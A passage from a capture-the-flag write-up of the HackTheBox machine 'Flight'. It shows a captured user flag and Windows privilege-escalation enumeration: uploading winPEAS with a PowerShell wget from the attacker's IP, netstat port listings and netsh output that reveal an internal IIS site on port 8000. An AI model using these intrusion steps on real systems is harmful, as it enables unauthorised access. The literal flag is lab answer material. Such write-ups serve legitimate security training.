<p>successful! got user flag: <code>4b75d3d79195394f018dccff2ef81592</code></p>
<p>proof:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image14.png" /></p>
<p>that was really tough.. lets move on to privesc</p>
<hr />
<h1 id="privesc">Privesc</h1>
<h2 id="investigating-the-filesystem">Investigating the filesystem</h2>
<p>Lets navigate to the filesystem to check for anything usefull:</p>
<p>The <code>C:</code> directory:</p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="x">    Directory: C:\</span>
</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>
</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a><span class="x">Mode                LastWriteTime         Length Name                                                                  </span>
</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a><span class="x">----                -------------         ------ ----                                                                  </span>
</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a><span class="x">d-----        8/23/2025   2:27 PM                inetpub                                                               </span>
</span><span id="__span-86-6"><a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a><span class="x">d-----         6/7/2022   6:39 AM                PerfLogs                                                              </span>
</span><span id="__span-86-7"><a id="__codelineno-86-7" name="__codelineno-86-7" href="#__codelineno-86-7"></a><span class="x">d-r---       10/21/2022  11:49 AM                Program Files                                                         </span>
</span><span id="__span-86-8"><a id="__codelineno-86-8" name="__codelineno-86-8" href="#__codelineno-86-8"></a><span class="x">d-----        7/20/2021  12:23 PM                Program Files (x86)                                                   </span>
</span><span id="__span-86-9"><a id="__codelineno-86-9" name="__codelineno-86-9" href="#__codelineno-86-9"></a><span class="x">d-----       10/28/2022   1:21 PM                Shared                                                                </span>
</span><span id="__span-86-10"><a id="__codelineno-86-10" name="__codelineno-86-10" href="#__codelineno-86-10"></a><span class="x">d-----        9/22/2022  12:28 PM                StorageReports                                                        </span>
</span><span id="__span-86-11"><a id="__codelineno-86-11" name="__codelineno-86-11" href="#__codelineno-86-11"></a><span class="x">d-r---        9/22/2022   1:16 PM                Users                                                                 </span>
</span><span id="__span-86-12"><a id="__codelineno-86-12" name="__codelineno-86-12" href="#__codelineno-86-12"></a><span class="x">d-----       10/21/2022  11:52 AM                Windows                                                               </span>
</span><span id="__span-86-13"><a id="__codelineno-86-13" name="__codelineno-86-13" href="#__codelineno-86-13"></a><span class="x">d-----        9/22/2022   1:16 PM                xampp </span>
</span></code></pre></div>
<p>when we got the shell initially as svc_apache, we where inside <code>xampp</code> folder in this path: “"C:\xampp\htdocs\school.flight.htb\”. The xampp folder inside has multiple xampp related files and i found nothing interesting there</p>
<p>Regarding the <code>Users</code> folder, it contains the user directories, i can only access svc_apache’s and inside i found nothing of value.</p>
<p>As for other folders like <code>PerfLogs</code>, <code>Program Files &amp; (86)</code> , <code>Shared</code> , <code>StorageReports</code> , <code>Windows</code> nothing useful was found</p>
<p>Last but not least, i noticed the presence of <code>inetpub</code> folder, which indicates that <strong>IIS (Internet Information Services)</strong> has been installed, we will keep that in mind for later.</p>
<p>For now, lets run winpeas to see if it we can find sth more helpful, or even find more information about that IIS server running</p>
<h2 id="using-winpeas">Using winpeas</h2>
<p>Upload winpeas on this dir “C:\xampp\htdocs\flight.htb”</p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="x">powershell -c wget 10.10.14.180:800/winPEAS.ps1 -outfile winPEAS.ps1</span>
</span></code></pre></div>
<p>or we could just upload it via the smbclient session we had earlier (easier)</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>put<span class="w"> </span>winPEAS.ps1
</span></code></pre></div>
<p>For some reason, even tho i run it on the shell, the results were printed on the webshell, also it took a while to run so be patient.</p>
<p>From the very large output, nothing stood out more than the listening ports, thus i decided to focus there especially due to the fact that we earlier found indicators of the presence of an IIS server running, and one of those ports below could be used by that server.</p>
<p><img alt="image.png" src="../MediaFiles/flight_image15.png" /></p>
<h3 id="listening-ports">Listening ports</h3>
<p>Lets take a more detailed look at the listening ports via this command:</p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="x">netstat -ano | findstr LISTENING</span>
</span></code></pre></div>
<p>PROTOCOL  LOCAL ADDRESS  Foreign Address  State  PID</p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="x">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5284</span>
</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a><span class="x">TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648</span>
</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a><span class="x">TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912</span>
</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a><span class="x">TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648</span>
</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a><span class="x">TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5284</span>
</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6" href="#__codelineno-90-6"></a><span class="x">TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span>
</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7" href="#__codelineno-90-7"></a><span class="x">TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648</span>
</span><span id="__span-90-8"><a id="__codelineno-90-8" name="__codelineno-90-8" href="#__codelineno-90-8"></a><span class="x">TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       912</span>
</span><span id="__span-90-9"><a id="__codelineno-90-9" name="__codelineno-90-9" href="#__codelineno-90-9"></a><span class="x">TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648</span>
</span><span id="__span-90-10"><a id="__codelineno-90-10" name="__codelineno-90-10" href="#__codelineno-90-10"></a><span class="x">TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648</span>
</span><span id="__span-90-11"><a id="__codelineno-90-11" name="__codelineno-90-11" href="#__codelineno-90-11"></a><span class="x">TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648</span>
</span><span id="__span-90-12"><a id="__codelineno-90-12" name="__codelineno-90-12" href="#__codelineno-90-12"></a><span class="x">TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4</span>
</span><span id="__span-90-13"><a id="__codelineno-90-13" name="__codelineno-90-13" href="#__codelineno-90-13"></a><span class="x">TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4</span>
</span><span id="__span-90-14"><a id="__codelineno-90-14" name="__codelineno-90-14" href="#__codelineno-90-14"></a><span class="x">TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2980</span>
</span><span id="__span-90-15"><a id="__codelineno-90-15" name="__codelineno-90-15" href="#__codelineno-90-15"></a><span class="x">TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4</span>
</span><span id="__span-90-16"><a id="__codelineno-90-16" name="__codelineno-90-16" href="#__codelineno-90-16"></a><span class="x">TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       488</span>
</span><span id="__span-90-17"><a id="__codelineno-90-17" name="__codelineno-90-17" href="#__codelineno-90-17"></a><span class="x">TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1204</span>
</span><span id="__span-90-18"><a id="__codelineno-90-18" name="__codelineno-90-18" href="#__codelineno-90-18"></a><span class="x">TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1744</span>
</span><span id="__span-90-19"><a id="__codelineno-90-19" name="__codelineno-90-19" href="#__codelineno-90-19"></a><span class="x">TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648</span>
</span><span id="__span-90-20"><a id="__codelineno-90-20" name="__codelineno-90-20" href="#__codelineno-90-20"></a><span class="x">TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648</span>
</span><span id="__span-90-21"><a id="__codelineno-90-21" name="__codelineno-90-21" href="#__codelineno-90-21"></a><span class="x">TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648</span>
</span><span id="__span-90-22"><a id="__codelineno-90-22" name="__codelineno-90-22" href="#__codelineno-90-22"></a><span class="x">TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       628</span>
</span><span id="__span-90-23"><a id="__codelineno-90-23" name="__codelineno-90-23" href="#__codelineno-90-23"></a><span class="x">TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       3028</span>
</span><span id="__span-90-24"><a id="__codelineno-90-24" name="__codelineno-90-24" href="#__codelineno-90-24"></a><span class="x">TCP    0.0.0.0:49725          0.0.0.0:0              LISTENING       3052</span>
</span></code></pre></div>
<p>What is our goal here?? First i found some interesting stuff about <code>PID = 4</code></p>
<h3 id="pid-4-in-windows">PID 4 in Windows</h3>
<ul>
<li>PID <code>4</code> is the <strong>System process</strong> (the kernel).</li>
<li>When you see <code>netstat -ano</code> or <code>Get-NetTCPConnection</code> showing PID 4, it usually means a <strong>kernel driver</strong> or <strong>Windows component</strong> is the actual socket owner.</li>
<li>Example: SMB (port 445), RPC, or even some HTTP listeners (HTTP.sys) can appear as PID 4.</li>
</ul>
<p>But which port corresponds to the IIS server? how can we know without doing port forwarding and navigating to the webpage manually?</p>
<h3 id="correlating-listening-ports-with-the-iis-server">Correlating listening ports with the IIS server</h3>
<p>The command below queries the <strong>HTTP Server (HTTP.sys) kernel driver</strong> and shows the current state of all HTTP-related services and their request queues.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>netsh<span class="w"> </span>http<span class="w"> </span>show<span class="w"> </span>servicestate
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>Snapshot<span class="w"> </span>of<span class="w"> </span>HTTP<span class="w"> </span>service<span class="w"> </span>state<span class="w"> </span><span class="o">(</span>Server<span class="w"> </span>Session<span class="w"> </span>View<span class="o">)</span>:<span class="w"> </span>
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>-----------------------------------------------------<span class="w"> </span>
</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a>
</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a>Server<span class="w"> </span>session<span class="w"> </span>ID:<span class="w"> </span>FF00000120000001
</span><span id="__span-92-5"><a id="__codelineno-92-5" name="__codelineno-92-5" href="#__codelineno-92-5"></a><span class="w">    </span>Version:<span class="w"> </span><span class="m">1</span>.0
</span><span id="__span-92-6"><a id="__codelineno-92-6" name="__codelineno-92-6" href="#__codelineno-92-6"></a><span class="w">    </span>State:<span class="w"> </span>Active
</span><span id="__span-92-7"><a id="__codelineno-92-7" name="__codelineno-92-7" href="#__codelineno-92-7"></a><span class="w">    </span>Properties:
</span><span id="__span-92-8"><a id="__codelineno-92-8" name="__codelineno-92-8" href="#__codelineno-92-8"></a><span class="w">        </span>Max<span class="w"> </span>bandwidth:<span class="w"> </span><span class="m">4294967295</span>
</span><span id="__span-92-9"><a id="__codelineno-92-9" name="__codelineno-92-9" href="#__codelineno-92-9"></a><span class="w">        </span>Timeouts:
</span><span id="__span-92-10"><a id="__codelineno-92-10" name="__codelineno-92-10" href="#__codelineno-92-10"></a><span class="w">            </span>Entity<span class="w"> </span>body<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-11"><a id="__codelineno-92-11" name="__codelineno-92-11" href="#__codelineno-92-11"></a><span class="w">            </span>Drain<span class="w"> </span>entity<span class="w"> </span>body<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-12"><a id="__codelineno-92-12" name="__codelineno-92-12" href="#__codelineno-92-12"></a><span class="w">            </span>Request<span class="w"> </span>queue<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-13"><a id="__codelineno-92-13" name="__codelineno-92-13" href="#__codelineno-92-13"></a><span class="w">            </span>Idle<span class="w"> </span>connection<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-14"><a id="__codelineno-92-14" name="__codelineno-92-14" href="#__codelineno-92-14"></a><span class="w">            </span>Header<span class="w"> </span><span class="nb">wait</span><span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-15"><a id="__codelineno-92-15" name="__codelineno-92-15" href="#__codelineno-92-15"></a><span class="w">            </span>Minimum<span class="w"> </span>send<span class="w"> </span>rate<span class="w"> </span><span class="o">(</span>bytes/sec<span class="o">)</span>:<span class="w"> </span><span class="m">150</span>
</span><span id="__span-92-16"><a id="__codelineno-92-16" name="__codelineno-92-16" href="#__codelineno-92-16"></a><span class="w">    </span>URL<span class="w"> </span>groups:
</span><span id="__span-92-17"><a id="__codelineno-92-17" name="__codelineno-92-17" href="#__codelineno-92-17"></a><span class="w">    </span>URL<span class="w"> </span>group<span class="w"> </span>ID:<span class="w"> </span>FE00000140000001
</span><span id="__span-92-18"><a id="__codelineno-92-18" name="__codelineno-92-18" href="#__codelineno-92-18"></a><span class="w">        </span>State:<span class="w"> </span>Active
</span><span id="__span-92-19"><a id="__codelineno-92-19" name="__codelineno-92-19" href="#__codelineno-92-19"></a><span class="w">        </span>Request<span class="w"> </span>queue<span class="w"> </span>name:<span class="w"> </span>Request<span class="w"> </span>queue<span class="w"> </span>is<span class="w"> </span>unnamed.
</span><span id="__span-92-20"><a id="__codelineno-92-20" name="__codelineno-92-20" href="#__codelineno-92-20"></a><span class="w">        </span>Properties:
</span><span id="__span-92-21"><a id="__codelineno-92-21" name="__codelineno-92-21" href="#__codelineno-92-21"></a><span class="w">            </span>Max<span class="w"> </span>bandwidth:<span class="w"> </span>inherited
</span><span id="__span-92-22"><a id="__codelineno-92-22" name="__codelineno-92-22" href="#__codelineno-92-22"></a><span class="w">            </span>Max<span class="w"> </span>connections:<span class="w"> </span>inherited
</span><span id="__span-92-23"><a id="__codelineno-92-23" name="__codelineno-92-23" href="#__codelineno-92-23"></a><span class="w">            </span>Timeouts:
</span><span id="__span-92-24"><a id="__codelineno-92-24" name="__codelineno-92-24" href="#__codelineno-92-24"></a><span class="w">                </span>Timeout<span class="w"> </span>values<span class="w"> </span>inherited
</span><span id="__span-92-25"><a id="__codelineno-92-25" name="__codelineno-92-25" href="#__codelineno-92-25"></a><span class="w">            </span>Number<span class="w"> </span>of<span class="w"> </span>registered<span class="w"> </span>URLs:<span class="w"> </span><span class="m">2</span>
</span><span id="__span-92-26"><a id="__codelineno-92-26" name="__codelineno-92-26" href="#__codelineno-92-26"></a><span class="w">            </span>Registered<span class="w"> </span>URLs:
</span><span id="__span-92-27"><a id="__codelineno-92-27" name="__codelineno-92-27" href="#__codelineno-92-27"></a><span class="w">                </span>HTTP://+:5985/WSMAN/
</span><span id="__span-92-28"><a id="__codelineno-92-28" name="__codelineno-92-28" href="#__codelineno-92-28"></a><span class="w">                </span>HTTP://+:47001/WSMAN/
</span><span id="__span-92-29"><a id="__codelineno-92-29" name="__codelineno-92-29" href="#__codelineno-92-29"></a>
</span><span id="__span-92-30"><a id="__codelineno-92-30" name="__codelineno-92-30" href="#__codelineno-92-30"></a>Server<span class="w"> </span>session<span class="w"> </span>ID:<span class="w"> </span>FD00000120000001
</span><span id="__span-92-31"><a id="__codelineno-92-31" name="__codelineno-92-31" href="#__codelineno-92-31"></a><span class="w">    </span>Version:<span class="w"> </span><span class="m">2</span>.0
</span><span id="__span-92-32"><a id="__codelineno-92-32" name="__codelineno-92-32" href="#__codelineno-92-32"></a><span class="w">    </span>State:<span class="w"> </span>Active
</span><span id="__span-92-33"><a id="__codelineno-92-33" name="__codelineno-92-33" href="#__codelineno-92-33"></a><span class="w">    </span>Properties:
</span><span id="__span-92-34"><a id="__codelineno-92-34" name="__codelineno-92-34" href="#__codelineno-92-34"></a><span class="w">        </span>Max<span class="w"> </span>bandwidth:<span class="w"> </span><span class="m">4294967295</span>
</span><span id="__span-92-35"><a id="__codelineno-92-35" name="__codelineno-92-35" href="#__codelineno-92-35"></a><span class="w">        </span>Timeouts:
</span><span id="__span-92-36"><a id="__codelineno-92-36" name="__codelineno-92-36" href="#__codelineno-92-36"></a><span class="w">            </span>Entity<span class="w"> </span>body<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-37"><a id="__codelineno-92-37" name="__codelineno-92-37" href="#__codelineno-92-37"></a><span class="w">            </span>Drain<span class="w"> </span>entity<span class="w"> </span>body<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-38"><a id="__codelineno-92-38" name="__codelineno-92-38" href="#__codelineno-92-38"></a><span class="w">            </span>Request<span class="w"> </span>queue<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">65535</span>
</span><span id="__span-92-39"><a id="__codelineno-92-39" name="__codelineno-92-39" href="#__codelineno-92-39"></a><span class="w">            </span>Idle<span class="w"> </span>connection<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-40"><a id="__codelineno-92-40" name="__codelineno-92-40" href="#__codelineno-92-40"></a><span class="w">            </span>Header<span class="w"> </span><span class="nb">wait</span><span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-41"><a id="__codelineno-92-41" name="__codelineno-92-41" href="#__codelineno-92-41"></a><span class="w">            </span>Minimum<span class="w"> </span>send<span class="w"> </span>rate<span class="w"> </span><span class="o">(</span>bytes/sec<span class="o">)</span>:<span class="w"> </span><span class="m">240</span>
</span><span id="__span-92-42"><a id="__codelineno-92-42" name="__codelineno-92-42" href="#__codelineno-92-42"></a><span class="w">    </span>URL<span class="w"> </span>groups:
</span><span id="__span-92-43"><a id="__codelineno-92-43" name="__codelineno-92-43" href="#__codelineno-92-43"></a><span class="w">    </span>URL<span class="w"> </span>group<span class="w"> </span>ID:<span class="w"> </span>FF00000040000001
</span><span id="__span-92-44"><a id="__codelineno-92-44" name="__codelineno-92-44" href="#__codelineno-92-44"></a><span class="w">        </span>State:<span class="w"> </span>Active
</span><span id="__span-92-45"><a id="__codelineno-92-45" name="__codelineno-92-45" href="#__codelineno-92-45"></a><span class="w">        </span>Request<span class="w"> </span>queue<span class="w"> </span>name:<span class="w"> </span>DefaultAppPool
</span><span id="__span-92-46"><a id="__codelineno-92-46" name="__codelineno-92-46" href="#__codelineno-92-46"></a><span class="w">        </span>Properties:
</span><span id="__span-92-47"><a id="__codelineno-92-47" name="__codelineno-92-47" href="#__codelineno-92-47"></a><span class="w">            </span>Max<span class="w"> </span>bandwidth:<span class="w"> </span>inherited
</span><span id="__span-92-48"><a id="__codelineno-92-48" name="__codelineno-92-48" href="#__codelineno-92-48"></a><span class="w">            </span>Max<span class="w"> </span>connections:<span class="w"> </span><span class="m">4294967295</span>
</span><span id="__span-92-49"><a id="__codelineno-92-49" name="__codelineno-92-49" href="#__codelineno-92-49"></a><span class="w">            </span>Timeouts:
</span><span id="__span-92-50"><a id="__codelineno-92-50" name="__codelineno-92-50" href="#__codelineno-92-50"></a><span class="w">                </span>Entity<span class="w"> </span>body<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-51"><a id="__codelineno-92-51" name="__codelineno-92-51" href="#__codelineno-92-51"></a><span class="w">                </span>Drain<span class="w"> </span>entity<span class="w"> </span>body<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-52"><a id="__codelineno-92-52" name="__codelineno-92-52" href="#__codelineno-92-52"></a><span class="w">                </span>Request<span class="w"> </span>queue<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">65535</span>
</span><span id="__span-92-53"><a id="__codelineno-92-53" name="__codelineno-92-53" href="#__codelineno-92-53"></a><span class="w">                </span>Idle<span class="w"> </span>connection<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">120</span>
</span><span id="__span-92-54"><a id="__codelineno-92-54" name="__codelineno-92-54" href="#__codelineno-92-54"></a><span class="w">                </span>Header<span class="w"> </span><span class="nb">wait</span><span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span>secs<span class="o">)</span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-92-55"><a id="__codelineno-92-55" name="__codelineno-92-55" href="#__codelineno-92-55"></a><span class="w">                </span>Minimum<span class="w"> </span>send<span class="w"> </span>rate<span class="w"> </span><span class="o">(</span>bytes/sec<span class="o">)</span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-92-56"><a id="__codelineno-92-56" name="__codelineno-92-56" href="#__codelineno-92-56"></a><span class="w">            </span>Logging<span class="w"> </span>information:
</span><span id="__span-92-57"><a id="__codelineno-92-57" name="__codelineno-92-57" href="#__codelineno-92-57"></a><span class="w">                </span>Log<span class="w"> </span>directory:<span class="w"> </span>C:<span class="se">\i</span>netpub<span class="se">\l</span>ogs<span class="se">\L</span>ogFiles<span class="se">\W</span>3SVC1
</span><span id="__span-92-58"><a id="__codelineno-92-58" name="__codelineno-92-58" href="#__codelineno-92-58"></a><span class="w">                </span>Log<span class="w"> </span>format:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-92-59"><a id="__codelineno-92-59" name="__codelineno-92-59" href="#__codelineno-92-59"></a><span class="w">            </span>Authentication<span class="w"> </span>Configuration:
</span><span id="__span-92-60"><a id="__codelineno-92-60" name="__codelineno-92-60" href="#__codelineno-92-60"></a><span class="w">                </span>Authentication<span class="w"> </span>schemes<span class="w"> </span>enabled:
</span><span id="__span-92-61"><a id="__codelineno-92-61" name="__codelineno-92-61" href="#__codelineno-92-61"></a><span class="w">            </span>Number<span class="w"> </span>of<span class="w"> </span>registered<span class="w"> </span>URLs:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-92-62"><a id="__codelineno-92-62" name="__codelineno-92-62" href="#__codelineno-92-62"></a><span class="w">            </span>Registered<span class="w"> </span>URLs:
</span><span id="__span-92-63"><a id="__codelineno-92-63" name="__codelineno-92-63" href="#__codelineno-92-63"></a><span class="w">                </span>HTTP://127.0.0.1:8000:127.0.0.1/
</span><span id="__span-92-64"><a id="__codelineno-92-64" name="__codelineno-92-64" href="#__codelineno-92-64"></a>
</span><span id="__span-92-65"><a id="__codelineno-92-65" name="__codelineno-92-65" href="#__codelineno-92-65"></a>Request<span class="w"> </span>queues:
</span><span id="__span-92-66"><a id="__codelineno-92-66" name="__codelineno-92-66" href="#__codelineno-92-66"></a><span class="w">    </span>Request<span class="w"> </span>queue<span class="w"> </span>name:<span class="w"> </span>Request<span class="w"> </span>queue<span class="w"> </span>is<span class="w"> </span>unnamed.
</span><span id="__span-92-67"><a id="__codelineno-92-67" name="__codelineno-92-67" href="#__codelineno-92-67"></a><span class="w">        </span>Version:<span class="w"> </span><span class="m">1</span>.0
</span><span id="__span-92-68"><a id="__codelineno-92-68" name="__codelineno-92-68" href="#__codelineno-92-68"></a><span class="w">        </span>State:<span class="w"> </span>Active
</span><span id="__span-92-69"><a id="__codelineno-92-69" name="__codelineno-92-69" href="#__codelineno-92-69"></a><span class="w">        </span>Request<span class="w"> </span>queue<span class="w"> </span><span class="m">503</span><span class="w"> </span>verbosity<span class="w"> </span>level:<span class="w"> </span>Basic
</span><span id="__span-92-70"><a id="__codelineno-92-70" name="__codelineno-92-70" href="#__codelineno-92-70"></a><span class="w">        </span>Max<span class="w"> </span>requests:<span class="w"> </span><span class="m">1000</span>
</span><span id="__span-92-71"><a id="__codelineno-92-71" name="__codelineno-92-71" href="#__codelineno-92-71"></a><span class="w">        </span>Number<span class="w"> </span>of<span class="w"> </span>active<span class="w"> </span>processes<span class="w"> </span>attached:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-92-72"><a id="__codelineno-92-72" name="__codelineno-92-72" href="#__codelineno-92-72"></a><span class="w">        </span>Process<span class="w"> </span>IDs:
</span><span id="__span-92-73"><a id="__codelineno-92-73" name="__codelineno-92-73" href="#__codelineno-92-73"></a><span class="w">            </span><span class="m">3416</span>
</span><span id="__span-92-74"><a id="__codelineno-92-74" name="__codelineno-92-74" href="#__codelineno-92-74"></a>
</span><span id="__span-92-75"><a id="__codelineno-92-75" name="__codelineno-92-75" href="#__codelineno-92-75"></a><span class="w">    </span>Request<span class="w"> </span>queue<span class="w"> </span>name:<span class="w"> </span>DefaultAppPool
</span><span id="__span-92-76"><a id="__codelineno-92-76" name="__codelineno-92-76" href="#__codelineno-92-76"></a><span class="w">        </span>Version:<span class="w"> </span><span class="m">2</span>.0
</span><span id="__span-92-77"><a id="__codelineno-92-77" name="__codelineno-92-77" href="#__codelineno-92-77"></a><span class="w">        </span>State:<span class="w"> </span>Active
</span><span id="__span-92-78"><a id="__codelineno-92-78" name="__codelineno-92-78" href="#__codelineno-92-78"></a><span class="w">        </span>Request<span class="w"> </span>queue<span class="w"> </span><span class="m">503</span><span class="w"> </span>verbosity<span class="w"> </span>level:<span class="w"> </span>Limited
</span><span id="__span-92-79"><a id="__codelineno-92-79" name="__codelineno-92-79" href="#__codelineno-92-79"></a><span class="w">        </span>Max<span class="w"> </span>requests:<span class="w"> </span><span class="m">1000</span>
</span><span id="__span-92-80"><a id="__codelineno-92-80" name="__codelineno-92-80" href="#__codelineno-92-80"></a><span class="w">        </span>Number<span class="w"> </span>of<span class="w"> </span>active<span class="w"> </span>processes<span class="w"> </span>attached:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-92-81"><a id="__codelineno-92-81" name="__codelineno-92-81" href="#__codelineno-92-81"></a><span class="w">        </span>Controller<span class="w"> </span>process<span class="w"> </span>ID:<span class="w"> </span><span class="m">3408</span>
</span><span id="__span-92-82"><a id="__codelineno-92-82" name="__codelineno-92-82" href="#__codelineno-92-82"></a><span class="w">        </span>Process<span class="w"> </span>IDs:
</span></code></pre></div>
<p>In the above output, the presence of the IIS server is verified according to these 2 indicators</p>
<p><code>Request queue name: DefaultAppPool</code> </p>
<p><code>Log directory: C:\inetpub\logs\LogFiles\W3SVC1</code></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>URL group ID: FF00000040000001
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>        State: Active
</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a>        Request queue name: DefaultAppPool
</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a>        Properties:
</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a>            Max bandwidth: inherited
</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a>            Max connections: 4294967295
</span><span id="__span-93-7"><a id="__codelineno-93-7" name="__codelineno-93-7" href="#__codelineno-93-7"></a>            Timeouts:
</span><span id="__span-93-8"><a id="__codelineno-93-8" name="__codelineno-93-8" href="#__codelineno-93-8"></a>                Entity body timeout (secs): 120
</span><span id="__span-93-9"><a id="__codelineno-93-9" name="__codelineno-93-9" href="#__codelineno-93-9"></a>                Drain entity body timeout (secs): 120
</span><span id="__span-93-10"><a id="__codelineno-93-10" name="__codelineno-93-10" href="#__codelineno-93-10"></a>                Request queue timeout (secs): 65535
</span><span id="__span-93-11"><a id="__codelineno-93-11" name="__codelineno-93-11" href="#__codelineno-93-11"></a>                Idle connection timeout (secs): 120
</span><span id="__span-93-12"><a id="__codelineno-93-12" name="__codelineno-93-12" href="#__codelineno-93-12"></a>                Header wait timeout (secs): 0
</span><span id="__span-93-13"><a id="__codelineno-93-13" name="__codelineno-93-13" href="#__codelineno-93-13"></a>                Minimum send rate (bytes/sec): 0
</span><span id="__span-93-14"><a id="__codelineno-93-14" name="__codelineno-93-14" href="#__codelineno-93-14"></a>            Logging information:
